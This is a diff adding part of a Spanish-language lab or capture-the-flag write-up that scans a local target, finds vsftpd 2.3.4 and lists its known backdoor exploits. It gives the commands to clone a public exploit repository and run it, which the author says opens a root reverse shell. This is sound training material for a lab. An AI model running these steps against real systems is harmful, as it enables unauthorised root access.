@@ -48,3 +48,33 @@ nmap -sCV -p21 -vvv -oN versionPorts 172.17.0.2
 - `-vvv`: Salida muy detallada y verbosa.
 - `-oN versionPorts`: Guarda los resultados en "versionPorts".
 - `172.17.0.2`: Dirección IP del host escaneado.
+
+```bash
+  PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Unix
+```
+Vemos que la versión de ftp es vsftpd 2.3.4, comprobamos en searchsploit si es vulnerable y vemos que si hay exploits que podríamos utilizar.
+```bash
+❯ searchsploit vsftpd 2.3.4
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                               |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                                    | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                                       | unix/remote/17491.rb
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+```
+En este caso yo voy a utilizar un exploit que encontramos en [GITHUB](https://github.com/Hellsender01/vsftpd_2.3.4_Exploit). Seguimos las instrucción que nos indican en la página y nos crea un reverse shell como usuario root de la máquina.
+´´´bash
+sudo python3 -m pip install pwntools
+git clone https://github.com/Hellsender01/vsftpd_2.3.4_Exploit.git
+cd vsftpd_2.3.4_Exploit/
+chmod +x exploit.py
+´´´
+´´´bash
+python3 exploit.py 172.17.0.2
+´´´
+
+
+
